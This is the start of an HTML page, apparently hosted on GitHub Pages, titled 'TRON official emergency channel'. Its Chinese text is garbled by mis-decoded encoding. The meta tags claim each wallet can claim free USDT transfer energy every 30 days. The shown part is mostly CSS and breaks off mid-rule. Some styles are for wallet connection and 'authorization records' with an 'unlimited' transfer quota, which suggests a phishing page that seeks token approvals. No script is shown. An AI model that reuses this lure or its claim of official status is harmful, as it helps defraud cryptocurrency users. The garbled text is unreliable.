<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TRONå®˜æ–¹åº”æ€¥é€šé“</title>
    <meta property="og:title" content="TRONå®˜æ–¹åº”æ€¥é€šé“" />
    <meta property="og:description" content="TRONä¸“å±èƒ½é‡é¢†å–é€šé“ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©å¯å…è´¹é¢†å–90000Î¼s USDTè½¬è´¦èƒ½é‡" />
    <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
    <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="TRONå®˜æ–¹åº”æ€¥é€šé“" />
    <meta name="twitter:description" content="TRONä¸“å±èƒ½é‡é¢†å–é€šé“ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©å¯å…è´¹é¢†å–90000Î¼s USDTè½¬è´¦èƒ½é‡" />
    <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
    <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        /* åŸæœ‰æ ·å¼å®Œå…¨ä¿ç•™ï¼Œæœªåšä»»ä½•ä¿®æ”¹ */
        * { margin: 0; padding: 0; box-sizing: border-box; }
      body { 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; /* å…¨å±€å­—ä½“ï¼ˆé€‚é…ä¸åŒç³»ç»Ÿï¼‰ */
    padding: 8px 6px; /* é¡µé¢å†…è¾¹è·ï¼ˆä¸Šä¸‹8pxã€å·¦å³6pxï¼‰ */
    max-width: 600px; /* é¡µé¢æœ€å¤§å®½åº¦ï¼ˆé€‚é…ç§»åŠ¨ç«¯ï¼‰ */
    margin: 0 auto; /* é¡µé¢æ°´å¹³å±…ä¸­ */
    background: #121212; /* è°ƒæ•´ï¼šå…¨å±€èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±é»‘è‰² */
    color: #E5E7EB; /* è°ƒæ•´ï¼šå…¨å±€é»˜è®¤æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°è‰² */
    min-height: 100vh; /* é¡µé¢æœ€å°é«˜åº¦å æ»¡è§†å£ */
    display: flex; /* å¯ç”¨å¼¹æ€§å¸ƒå±€ */
    flex-direction: column; /* å­å…ƒç´ å‚ç›´æ’åˆ— */
    gap: 5px; /* è°ƒæ•´ï¼šæ¨¡å—ä¹‹é—´çš„é—´è·ï¼ˆç¼©å°ä¸º5pxæ›´ç´§å‡‘ï¼‰ */
    border-radius: 8px; /* é¡µé¢å¤–å±‚åœ†è§’ */
    border-left: 3px solid #2563EB; /* è°ƒæ•´ï¼šé¡µé¢å·¦ä¾§è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±è“è‰² */
    font-size: 14px; /* è°ƒæ•´ï¼šå…¨å±€åŸºç¡€å­—ä½“å¤§å°ï¼ˆè°ƒå¤§æ›´é†’ç›®ï¼‰ */
    overflow-x: hidden; /* éšè—æ°´å¹³æº¢å‡ºå†…å®¹ */
}

/* ä¸»å†…å®¹å®¹å™¨æ ·å¼ */
.container {
    flex: 1; /* è°ƒæ•´ï¼šå æ»¡é¡µé¢å‰©ä½™å‚ç›´ç©ºé—´ï¼ˆæ¶ˆé™¤åº•éƒ¨ç©ºæ¡£ï¼‰ */
    display: flex;
    flex-direction: column;
    gap: 5px; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ¨¡å—é—´è·ï¼ˆ5pxæ›´ç´§å‡‘ï¼‰ */
    overflow-y: auto; /* å†…å®¹æº¢å‡ºæ—¶æ˜¾ç¤ºå‚ç›´æ»šåŠ¨æ¡ */
    padding-top: 90px; /* è°ƒæ•´ï¼šç»™é¡¶éƒ¨å›ºå®šå®¹å™¨é¢„ç•™ç©ºé—´ï¼ˆé¿å…å†…å®¹è¢«é®æŒ¡ï¼‰ */
}

/* é¡¶éƒ¨å›ºå®šå®¹å™¨æ ·å¼ */
.header-container {
    display: flex; /* å®¹å™¨å†…å…ƒç´ å¼¹æ€§å¸ƒå±€ */
    justify-content: space-between; /* è°ƒæ•´ï¼šå®¹å™¨å†…å…ƒç´ å·¦å³ä¸¤ç«¯å¯¹é½ */
    align-items: flex-end; /* è°ƒæ•´ï¼šå®¹å™¨å†…å…ƒç´ å‚ç›´æ–¹å‘é ä¸‹å¯¹é½ */
    padding: 8px 8px; /* å®¹å™¨å†…è¾¹è·ï¼ˆä¸Šä¸‹8pxã€å·¦å³8pxï¼‰ */
    border-bottom: 1px solid #334155; /* è°ƒæ•´ï¼šå®¹å™¨åº•éƒ¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°è‰² */
    margin-bottom: 3px; /* è°ƒæ•´ï¼šå®¹å™¨ä¸ä¸‹æ–¹å…ƒç´ çš„é—´è·ï¼ˆ3pxï¼‰ */
    min-height: 80px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å°é«˜åº¦ï¼ˆç¡®ä¿å†…å®¹ä¸æŒ¤å˜å½¢ï¼‰ */
    padding-bottom:10px; /* è°ƒæ•´ï¼šå®¹å™¨åº•éƒ¨å•ç‹¬å†…è¾¹è·ï¼ˆ10pxï¼‰ */
    box-sizing: border-box; /* ç›’æ¨¡å‹ï¼šå†…è¾¹è·/è¾¹æ¡†ä¸æ’‘å¤§å®¹å™¨ */
    position: fixed; /* è°ƒæ•´ï¼šå®¹å™¨å›ºå®šå®šä½ï¼ˆä¸éšé¡µé¢æ»šåŠ¨ï¼‰ */
    top: 0; /* è°ƒæ•´ï¼šå›ºå®šåœ¨é¡µé¢é¡¶éƒ¨ */
    left: 0; /* è°ƒæ•´ï¼šå›ºå®šåœ¨é¡µé¢å·¦ä¾§ */
    right: 0; /* è°ƒæ•´ï¼šå›ºå®šåœ¨é¡µé¢å³ä¾§ï¼ˆå®ç°å®½åº¦å æ»¡ï¼‰ */
    max-width: 600px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å¤§å®½åº¦ï¼ˆå’Œé¡µé¢ä¸€è‡´ï¼‰ */
    margin: 0 auto; /* è°ƒæ•´ï¼šå®¹å™¨æ°´å¹³å±…ä¸­ */
    background: #121212; /* è°ƒæ•´ï¼šé¡¶éƒ¨å®¹å™¨åº•è‰² | è‰²å·å¯¹åº”ï¼šæ·±é»‘è‰² */
    z-index: 999; /* è°ƒæ•´ï¼šå±‚çº§ä¼˜å…ˆçº§ï¼ˆç¡®ä¿åœ¨å…¶ä»–å…ƒç´ ä¸Šæ–¹ï¼‰ */
}

/* è¯­è¨€é€‰æ‹©æ æ ·å¼ */
.lang-switch {
    padding: 0;
    margin: 0;
    display: flex; /* è°ƒæ•´ï¼šè¯­è¨€æ å¯ç”¨å¼¹æ€§å¸ƒå±€ */
    flex-direction: column; /* è°ƒæ•´ï¼šè¯­è¨€æ å­å…ƒç´ ä¸Šä¸‹æ’åˆ— */
    align-items: flex-end; /* è°ƒæ•´ï¼šè¯­è¨€æ å­å…ƒç´ é å³å¯¹é½ */
    gap: 6px; /* è°ƒæ•´ï¼šè¯­è¨€æ å†…å…ƒç´ é—´è·ï¼ˆ6pxï¼‰ */
}

/* è¯­è¨€é€‰æ‹©æ æ–‡å­—æ ·å¼ */
.lang-text {
  color: #E5E7EB; /* è°ƒæ•´ï¼šè¯­è¨€æ æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°è‰² */
  font-size: 12px; /* è°ƒæ•´ï¼šè¯­è¨€æ æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
}

/* è¯­è¨€ä¸‹æ‹‰å®¹å™¨æ ·å¼ */
.lang-dropdown {
    position: relative; /* ç›¸å¯¹å®šä½ï¼ˆä½œä¸ºä¸‹æ‹‰èœå•çš„çˆ¶å®¹å™¨ï¼‰ */
    display: inline-block;
}

/* è¯­è¨€ä¸‹æ‹‰è§¦å‘æŒ‰é’®æ ·å¼ */
.lang-toggle {
    padding: 3px 8px; /* è°ƒæ•´ï¼šæŒ‰é’®å†…è¾¹è·ï¼ˆæ›´æ˜“ç‚¹å‡»ï¼‰ */
    border: 1px solid #3b82f6; /* è°ƒæ•´ï¼šæŒ‰é’®è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    border-radius: 20px; /* è°ƒæ•´ï¼šæŒ‰é’®åœ†è§’ï¼ˆèƒ¶å›Šå½¢çŠ¶ï¼‰ */
    background: transparent; /* è°ƒæ•´ï¼šæŒ‰é’®èƒŒæ™¯é€æ˜ */
    color: #E5E7EB; /* è°ƒæ•´ï¼šæŒ‰é’®æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°è‰² */
    font-size: 13px; /* è°ƒæ•´ï¼šæŒ‰é’®æ–‡å­—å¤§å°ï¼ˆ13pxï¼‰ */
    cursor: pointer; /* é¼ æ ‡æ‚¬æµ®æ˜¾ç¤ºæ‰‹å‹ */
    display: flex;
    align-items: center;
    gap: 4px; /* è°ƒæ•´ï¼šæŒ‰é’®å†…å…ƒç´ é—´è·ï¼ˆ4pxï¼‰ */
}
.lang-toggle:hover {
    background: rgba(59, 130, 246, 0.2); /* è°ƒæ•´ï¼šæŒ‰é’® hover èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šè“è‰²é€æ˜ï¼ˆé€æ˜åº¦20%ï¼‰ */
}

/* è¯­è¨€ä¸‹æ‹‰èœå•æ ·å¼ */
.lang-dropdown-menu {
    display: none; /* é»˜è®¤éšè—ä¸‹æ‹‰èœå• */
    position: absolute; /* ç»å¯¹å®šä½ï¼ˆç›¸å¯¹äºçˆ¶å®¹å™¨ï¼‰ */
    top: 100%; /* è°ƒæ•´ï¼šèœå•åœ¨æŒ‰é’®æ­£ä¸‹æ–¹ */
    right: 0; /* è°ƒæ•´ï¼šèœå•é å³å¯¹é½ */
    min-width: 120px; /* è°ƒæ•´ï¼šèœå•æœ€å°å®½åº¦ï¼ˆ120pxï¼‰ */
    background: #1E1E1E; /* è°ƒæ•´ï¼šèœå•èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°é»‘è‰² */
    border: 1px solid #3b82f6; /* è°ƒæ•´ï¼šèœå•è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    border-radius: 8px; /* è°ƒæ•´ï¼šèœå•åœ†è§’ï¼ˆ8pxï¼‰ */
    padding: 4px 0; /* è°ƒæ•´ï¼šèœå•å†…è¾¹è·ï¼ˆä¸Šä¸‹4pxï¼‰ */
    z-index: 1000; /* è°ƒæ•´ï¼šèœå•å±‚çº§ï¼ˆé«˜äºå…¶ä»–å…ƒç´ ï¼‰ */
    box-shadow: 0 4px 8px rgba(0,0,0,0.3); /* è°ƒæ•´ï¼šèœå•é˜´å½±ï¼ˆå¢å¼ºå±‚æ¬¡æ„Ÿï¼‰ */
}

/* è¯­è¨€ä¸‹æ‹‰é€‰é¡¹æ ·å¼ */
.lang-dropdown-item {
    display: flex;
    align-items: center;
    gap: 6px; /* è°ƒæ•´ï¼šé€‰é¡¹å†…å…ƒç´ é—´è·ï¼ˆ6pxï¼‰ */
    padding: 6px 12px; /* è°ƒæ•´ï¼šé€‰é¡¹å†…è¾¹è·ï¼ˆæ›´æ˜“ç‚¹å‡»ï¼‰ */
    color: #E5E7EB; /* è°ƒæ•´ï¼šé€‰é¡¹æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°è‰² */
    font-size: 13px; /* è°ƒæ•´ï¼šé€‰é¡¹æ–‡å­—å¤§å°ï¼ˆ13pxï¼‰ */
    cursor: pointer;
    background: transparent; /* é€‰é¡¹èƒŒæ™¯é€æ˜ */
    border: none;
    width: 100%;
    text-align: left;
}
.lang-dropdown-item:hover {
    background: rgba(59, 130, 246, 0.2); /* è°ƒæ•´ï¼šé€‰é¡¹ hover èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šè“è‰²é€æ˜ï¼ˆé€æ˜åº¦20%ï¼‰ */
}

/* ä¸‹æ‹‰èœå•æ˜¾ç¤ºçŠ¶æ€ï¼ˆé…åˆJSï¼‰ */
.lang-dropdown.open .lang-dropdown-menu {
    display: block; /* æ‰“å¼€ä¸‹æ‹‰èœå•æ—¶æ˜¾ç¤º */
}

/* é¡¶éƒ¨Logo+æ ‡é¢˜å®¹å™¨æ ·å¼ */
.header {
    text-align: left;
    padding: 0;
    padding-bottom:1px; /* è°ƒæ•´ï¼šå®¹å™¨åº•éƒ¨å†…è¾¹è·ï¼ˆ1pxï¼‰ */
    border-bottom: none; /* å–æ¶ˆåº•éƒ¨è¾¹æ¡† */
    margin-bottom: 0;
    display: flex;
    align-items: flex-end; /* è°ƒæ•´ï¼šå®¹å™¨å†…å…ƒç´ å‚ç›´é ä¸‹å¯¹é½ */
    gap: 10px; /* è°ƒæ•´ï¼šLogoä¸æ–‡å­—çš„é—´è·ï¼ˆ10pxï¼‰ */
}
.header > div {
    display: flex; 
    gap: 10px; 
    align-items: flex-end; /* è°ƒæ•´ï¼šå­å…ƒç´ å‚ç›´é ä¸‹å¯¹é½ */
}

/* Logoæ ·å¼ */
.header-logo {
    width: 130px; /* Logoå®½åº¦ */
    height: 50px; /* è°ƒæ•´ï¼šLogoé«˜åº¦ï¼ˆä»40pxæ”¹ä¸º50pxï¼Œæ›´é†’ç›®ï¼‰ */
    border-radius: 4px; /* Logoåœ†è§’ */
    object-fit: contain; /* è°ƒæ•´ï¼šLogoä¿æŒæ¯”ä¾‹ä¸å˜å½¢ */
}

/* è­¦å‘Šæ æ ·å¼ */
.warning {
    background: #1e2925; /* è°ƒæ•´ï¼šè­¦å‘Šæ èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç»¿ç°è‰² */
    color: #a0a8a4; /* è°ƒæ•´ï¼šè­¦å‘Šæ æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°ç»¿è‰² */
    padding: 8px; /* è°ƒæ•´ï¼šè­¦å‘Šæ å†…è¾¹è·ï¼ˆ8pxï¼‰ */
    border-radius: 8px; /* è­¦å‘Šæ åœ†è§’ */
    font-size: 12px; /* è°ƒæ•´ï¼šè­¦å‘Šæ æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
    border-left: 3px solid #f97316; /* è°ƒæ•´ï¼šè­¦å‘Šæ å·¦ä¾§è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ©™è‰² */
    line-height: 1.5; /* è°ƒæ•´ï¼šæ–‡å­—è¡Œé«˜ï¼ˆ1.5å€æ›´æ˜“è¯»ï¼‰ */
}
.warning strong {
    color: #f97316; /* è°ƒæ•´ï¼šè­¦å‘Šæ å¼ºè°ƒæ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæ©™è‰² */
}

/* ä½™é¢æ˜¾ç¤ºå®¹å™¨æ ·å¼ */
#userInfo {
    text-align: center;
    font-size: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…åŸºç¡€æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
    padding: 20px 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…è¾¹è·ï¼ˆæ‰©å¤§é¿å…å†…å®¹æº¢å‡ºï¼‰ */
    background: #1e2925; /* è°ƒæ•´ï¼šä½™é¢å®¹å™¨èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç»¿ç°è‰² */
    border-radius: 8px; /* å®¹å™¨åœ†è§’ */
    border: 1px solid #334155; /* è°ƒæ•´ï¼šå®¹å™¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°è‰² */
    line-height: 1.6; /* è°ƒæ•´ï¼šæ–‡å­—è¡Œé«˜ï¼ˆ1.6å€ï¼‰ */
    min-height: 120px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å°é«˜åº¦ï¼ˆå®¹çº³å››è§’å†…å®¹ï¼‰ */
    position: relative; /* ç›¸å¯¹å®šä½ï¼ˆä½œä¸ºå­å…ƒç´ ç»å¯¹å®šä½çš„çˆ¶å®¹å™¨ï¼‰ */
}

/* ä½™é¢é¡¹ï¼ˆUSDT/TRX/èƒ½é‡/å®½å¸¦ï¼‰åŸºç¡€æ ·å¼ */
.balance-item {
    position: absolute; /* ç»å¯¹å®šä½ï¼ˆç›¸å¯¹äº#userInfoï¼‰ */
    display: flex;
    flex-direction: column; /* å­å…ƒç´ ä¸Šä¸‹æ’åˆ— */
    align-items: center; /* å­å…ƒç´ æ°´å¹³å±…ä¸­ */
    gap: 1px; /* è°ƒæ•´ï¼šæ ‡é¢˜ä¸æ•°å€¼çš„é—´è·ï¼ˆ4pxï¼‰ */
}

/* ä½™é¢é¡¹-æ ‡é¢˜æ ·å¼ï¼ˆå¦‚â€œUSDTâ€â€œTRXâ€ï¼‰ */
.balance-item > span:first-child {
    font-size: 15px; /* è°ƒæ•´ï¼šæ ‡é¢˜å­—ä½“å¤§å°ï¼ˆæ¯”æ•°å€¼å¤§1pxæ›´é†’ç›®ï¼‰ */
    color: #3b82f6; /* è°ƒæ•´ï¼šæ ‡é¢˜é¢œè‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
}

/* ä½™é¢é¡¹-æ•°å€¼æ ·å¼ï¼ˆå¦‚â€œ0.00â€â€œ0â€ï¼‰ */
.balance-value {
    color: #4ade80; /* è°ƒæ•´ï¼šæ•°å€¼é¢œè‰² | è‰²å·å¯¹åº”ï¼šç»¿è‰² */
    font-size: 16px; /* è°ƒæ•´ï¼šæ•°å€¼å­—ä½“å¤§å°ï¼ˆ16pxï¼‰ */
    font-weight: 600; /* è°ƒæ•´ï¼šæ•°å€¼åŠ ç²—ï¼ˆæ›´çªå‡ºï¼‰ */
}

/* ä½™é¢é¡¹-ä½ç½®è°ƒæ•´ */
.balance-usdt { top: 10px; left: 40px; } /* è°ƒæ•´ï¼šUSDTé¡¹ä½ç½®ï¼ˆé¡¶éƒ¨å·¦æ–¹ï¼‰ */
.balance-trx { top: 10px; right: 40px; } /* è°ƒæ•´ï¼šTRXé¡¹ä½ç½®ï¼ˆé¡¶éƒ¨å³æ–¹ï¼‰ */
.balance-energy { bottom: 10px; left: 40px; } /* è°ƒæ•´ï¼šèƒ½é‡é¡¹ä½ç½®ï¼ˆåº•éƒ¨å·¦æ–¹ï¼‰ */
.balance-bandwidth { bottom: 10px; right: 40px; } /* è°ƒæ•´ï¼šå®½å¸¦é¡¹ä½ç½®ï¼ˆåº•éƒ¨å³æ–¹ï¼‰ */

#userInfo span {
    font-weight: 500; /* è°ƒæ•´ï¼šæ–‡å­—åŠ ç²—ï¼ˆ500æƒé‡ï¼‰ */
}

/* é’±åŒ…çŠ¶æ€å®¹å™¨æ ·å¼ */
#walletStatusContainer {
    background: #1e2925; /* è°ƒæ•´ï¼šå®¹å™¨èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç»¿ç°è‰² */
    padding: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…è¾¹è·ï¼ˆ12pxï¼‰ */
    border-radius: 8px; /* å®¹å™¨åœ†è§’ */
    border: 1px solid #334155; /* è°ƒæ•´ï¼šå®¹å™¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°è‰² */
    font-size: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
    color: #a0a8a4; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°ç»¿è‰² */
    line-height: 1.6; /* è°ƒæ•´ï¼šæ–‡å­—è¡Œé«˜ï¼ˆ1.6å€ï¼‰ */
    border-right: 5px solid #4ade80; /* è°ƒæ•´ï¼šå®¹å™¨å³ä¾§è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šç»¿è‰² */
    min-height: 150px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å°é«˜åº¦ï¼ˆå®¹çº³å†…å®¹ï¼‰ */
}
#walletStatusContainer .status-title {
    font-size: 14px; /* è°ƒæ•´ï¼šæ ‡é¢˜æ–‡å­—å¤§å°ï¼ˆ14pxï¼‰ */
    color: #3b82f6; /* è°ƒæ•´ï¼šæ ‡é¢˜é¢œè‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    margin-bottom: 6px; /* è°ƒæ•´ï¼šæ ‡é¢˜ä¸å†…å®¹çš„é—´è·ï¼ˆ6pxï¼‰ */
    display: flex;
    align-items: center;
    gap: 6px; /* è°ƒæ•´ï¼šæ ‡é¢˜å†…å…ƒç´ é—´è·ï¼ˆ6pxï¼‰ */
}
#walletStatusContainer .connected-content {
    display: none; /* é»˜è®¤éšè—â€œå·²è¿æ¥â€å†…å®¹ */
    min-height: 110px; /* è°ƒæ•´ï¼šå·²è¿æ¥çŠ¶æ€ä¸‹çš„æœ€å°é«˜åº¦ */
}
#walletStatusContainer.connected .disconnected-content {
    display: none; /* å·²è¿æ¥æ—¶éšè—â€œæœªè¿æ¥â€å†…å®¹ */
}
#walletStatusContainer.connected .connected-content {
    display: block; /* å·²è¿æ¥æ—¶æ˜¾ç¤ºâ€œå·²è¿æ¥â€å†…å®¹ */
}
/* é’±åŒ…çŠ¶æ€-é«˜äº®æ–‡å­—æ ·å¼ */
#walletStatusContainer .highlight {
    color: #3b82f6; /* è°ƒæ•´ï¼šé«˜äº®æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    font-weight: 500; /* è°ƒæ•´ï¼šé«˜äº®æ–‡å­—åŠ ç²— */
}
/* é’±åŒ…çŠ¶æ€-æ©™è‰²æç¤ºæ–‡å­—æ ·å¼ */
#walletStatusContainer.connected .connected-content .orange-tip {
    color: #f97316; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæ©™è‰² */
    margin-top: 5px; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—ä¸ä¸Šæ–¹å†…å®¹çš„é—´è·ï¼ˆ5pxï¼‰ */
    font-size: 12px; /* è°ƒæ•´ï¼šæç¤ºæ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
}

/* åˆçº¦å‰©ä½™èµ„æºå®¹å™¨æ ·å¼ */
#contractResourceContainer {
    background: #1e2925; /* è°ƒæ•´ï¼šå®¹å™¨èƒŒæ™¯è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç»¿ç°è‰² */
    padding: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…è¾¹è·ï¼ˆ12pxï¼‰ */
    border-radius: 8px; /* å®¹å™¨åœ†è§’ */
    border: 1px solid #334155; /* è°ƒæ•´ï¼šå®¹å™¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šæ·±ç°è‰² */
    font-size: 12px; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ–‡å­—å¤§å°ï¼ˆ12pxï¼‰ */
    color: #a0a8a4; /* è°ƒæ•´ï¼šå®¹å™¨å†…æ–‡å­—è‰² | è‰²å·å¯¹åº”ï¼šæµ…ç°ç»¿è‰² */
    line-height: 1.7; /* è°ƒæ•´ï¼šæ–‡å­—è¡Œé«˜ï¼ˆ1.7å€ï¼‰ */
    border-bottom: 2px solid rgba(59, 130, 246, 0.2); /* è°ƒæ•´ï¼šå®¹å™¨åº•éƒ¨è¾¹æ¡†è‰² | è‰²å·å¯¹åº”ï¼šè“è‰²é€æ˜ï¼ˆé€æ˜åº¦20%ï¼‰ */
    min-height: 80px; /* è°ƒæ•´ï¼šå®¹å™¨æœ€å°é«˜åº¦ï¼ˆå®¹çº³å†…å®¹ï¼‰ */
}
#contractResourceContainer .status-title {
    font-size: 14px; /* è°ƒæ•´ï¼šæ ‡é¢˜æ–‡å­—å¤§å°ï¼ˆ14pxï¼‰ */
    color: #3b82f6; /* è°ƒæ•´ï¼šæ ‡é¢˜é¢œè‰² | è‰²å·å¯¹åº”ï¼šè“è‰² */
    margin-bottom: 6px; /* è°ƒæ•´ï¼šæ ‡é¢˜ä¸å†…å®¹çš„é—´è·ï¼ˆ6pxï¼‰ */
    display: flex;
    align-items: center;
    gap: 4px; /* è°ƒæ•´ï¼šæ ‡é¢˜å†…å…ƒç´ é—´è·ï¼ˆ4pxï¼‰ */
}
/* åˆçº¦èµ„æºå›¾æ ‡è‰²å· */
#contractResourceContainer .status-title i {
    font-size: 16px; 
    color: #93c5fd; /* åŒ¹é…è‰²å· */
}
/* åˆçº¦èµ„æºé«˜äº®æ–‡å­—ï¼šåŒ¹é…è‰²å· */
#contractResourceContainer .highlight {
    color: #3b82f6; /* åŒ¹é…è‰²å· */
    font-weight: 500;
}
/* åˆçº¦èµ„æºæ ‡ç­¾ï¼šåŒ¹é…è‰²å· */
#contractResourceContainer .data-tag {
    background: rgba(59, 130, 246, 0.15); /* åŒ¹é…è‰²å· */
    padding: 2px 6px; 
    border-radius: 4px;
    border: 1px solid rgba(59, 130, 246, 0.3); /* åŒ¹é…è‰²å· */
    font-size: 12px; 
    color: #3b82f6; /* åŒ¹é…è‰²å· */
}
/* ç‰¹æ®Šæç¤ºå®¹å™¨ */
.special-tip-container {
    background: #1e2925; /* åŒ¹é…è‰²å· */
    padding: 16px; 
    border-radius: 8px;
    border: 1px solid #334155; /* åŒ¹é…è‰²å· */
    display: none;
    margin-top: 4px;
    border-right: 3px solid #f97316; /* åŒ¹é…è‰²å· */
    box-shadow: -2px 0 0 0 #fb923c; /* åŒ¹é…è‰²å· */
    min-height: 80px; 
}
/* ç‰¹æ®Šæç¤ºæ ‡é¢˜ï¼šåŒ¹é…è‰²å· */
.special-tip-title {
    font-size: 16px; 
    color: #f97316; /* åŒ¹é…è‰²å· */
    font-weight: 600;
    margin-bottom: 6px;
}
/* ç‰¹æ®Šæç¤ºå†…å®¹ï¼šåŒ¹é…è‰²å· */
.special-tip-content {
    font-size: 14px; 
    color: #f97316; /* åŒ¹é…è‰²å· */
    line-height: 1.7;
    font-weight: 500;
}
/* æˆæƒè®°å½•å®¹å™¨ */
.record-list {
    background: #1e2925; /* åŒ¹é…è‰²å· */
    padding: 12px; 
    border-radius: 8px;
    border: 1px solid #334155; /* åŒ¹é…è‰²å· */
    font-size: 12px; 
    border-right: 5px solid #4ade80; /* åŒ¹é…è‰²å· */
    display: none;
    min-height: 100px; 
}
.record-item {
    margin-bottom: 10px;
    padding-bottom: 10px;
    border-bottom: 1px solid #334155; /* åŒ¹é…è‰²å· */
}
.record-item:hover {
    border-color: #3b82f6; /* åŒ¹é…è‰²å· */
    transition: border-color 0.3s;
}
/* è®°å½•é¡¹æ–‡å­—ï¼šåŒ¹é…è‰²å· */
.record-item p {
    margin-bottom: 6px;
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    line-height: 1.5;
    font-size: 13px; 
}
/* è®°å½•é¡¹å¼ºè°ƒæ–‡å­—ï¼šåŒ¹é…è‰²å· */
.record-item p strong {
    color: #e0e8e4; /* åŒ¹é…è‰²å· */
    margin-right: 5px;
}
/* è®°å½•æ ‡é¢˜ï¼šåŒ¹é…è‰²å· */
#recordTypeTitle, #recordAmountTitle {
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    font-weight: 500;
}
/* â€œUSDTè½¬è´¦â€â€œæ— é™â€ï¼šåŒ¹é…è‰²å· */
#energyType, #transferQuota {
    color: #3b82f6; /* åŒ¹é…è‰²å· */
    font-weight: 600;
}
/* æˆæƒè®°å½•æ–‡æœ¬ï¼šåŒ¹é…è‰²å· */
#approvalRecords {
    color: #4ade80; /* åŒ¹é…è‰²å· */
}
/* é“¾æ¥ï¼šåŒ¹é…è‰²å· */
.tx-link {
    color: #3b82f6; /* åŒ¹é…è‰²å· */
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 13px; 
}
.tx-link:hover {
    text-decoration: underline;
}
/* æŒ‰é’®ç»„ */
.btn-group {
    display: flex;
    flex-direction: column;
    gap: 6px; 
    margin-top: 4px; 
    padding: 6px 0;
    border-top: 1px solid #334155; /* åŒ¹é…è‰²å· */
}
/* æŒ‰é’®ï¼šåŒ¹é…è‰²å· */
.btn {
    width: 100%;
    padding: 12px; 
    font-size: 15px; 
    border: none;
    border-radius: 8px;
    background: #2563eb; /* åŒ¹é…è‰²å· */
    color: white; 
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: background 0.3s;
}
.btn:hover {
    background: #3b82f6; /* åŒ¹é…è‰²å· */
}
.btn:disabled {
    background: #294b75; /* åŒ¹é…è‰²å· */
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    cursor: not-allowed;
}
/* é¡µè„šï¼šåŒ¹é…è‰²å· */
.footer-info {
    margin-top: 6px;
    padding-top: 6px;
    border-top: 1px solid #334155; /* åŒ¹é…è‰²å· */
    font-size: 10px; 
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    text-align: center;
    line-height: 1.7;
}
.footer-info a {
    color: #3b82f6; /* åŒ¹é…è‰²å· */
    text-decoration: none;
}
.footer-info a:hover {
    text-decoration: underline;
} 
.text-right {
    text-align: right;
}
/* å®¡æ ¸æç¤ºï¼šåŒ¹é…è‰²å· */
.review-tip {
    color: #4ade80; /* åŒ¹é…è‰²å· */
